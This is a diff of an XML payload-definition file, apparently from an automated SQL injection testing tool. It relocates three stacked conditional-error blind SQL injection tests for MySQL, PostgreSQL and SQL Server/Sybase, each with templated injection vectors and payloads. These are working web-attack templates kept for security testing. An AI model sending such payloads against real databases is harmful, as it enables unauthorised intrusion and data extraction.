@@ -805,6 +805,70 @@ Formats:
     <!-- End of boolean-based blind tests - GROUP BY and ORDER BY clauses -->
 
 
+    <!-- Stacked conditional-error blind queries tests -->
+    <test>
+        <title>MySQL stacked conditional-error blind queries</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>; IF(([INFERENCE]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</vector>
+        <request>
+            <payload>; IF(([RANDNUM]=[RANDNUM]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>; IF(([RANDNUM]=[RANDNUM1]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL stacked conditional-error blind queries</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>2</where>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</vector>
+        <request>
+            <payload>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase stacked conditional-error blind queries</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>; IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</vector>
+        <request>
+            <payload>; IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>; IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+    <!-- End of stacked conditional-error blind queries tests -->
+
+
     <!-- Error-based tests - WHERE or HAVING clause -->
     <test>
         <title>MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause</title>
@@ -1578,70 +1642,6 @@ Formats:
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
     <!-- End of stacked queries tests -->
-
-
-    <!-- Stacked conditional-error blind queries tests -->
-    <test>
-        <title>MySQL stacked conditional-error blind queries</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>0</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>; IF(([INFERENCE]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</vector>
-        <request>
-            <payload>; IF(([RANDNUM]=[RANDNUM]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</payload>
-            <comment>#</comment>
-        </request>
-        <response>
-            <comparison>; IF(([RANDNUM]=[RANDNUM1]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL stacked conditional-error blind queries</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>0</risk>
-        <clause>0</clause>
-        <where>2</where>
-        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</vector>
-        <request>
-            <payload>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <comparison>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</comparison>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Microsoft SQL Server/Sybase stacked conditional-error blind queries</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>0</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>; IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</vector>
-        <request>
-            <payload>; IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <comparison>; IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</comparison>
-        </response>
-        <details>
-            <dbms>Microsoft SQL Server</dbms>
-            <os>Windows</os>
-        </details>
-    </test>
-    <!-- End of stacked conditional-error blind queries tests -->
 
 
     <!-- AND time-based blind tests -->
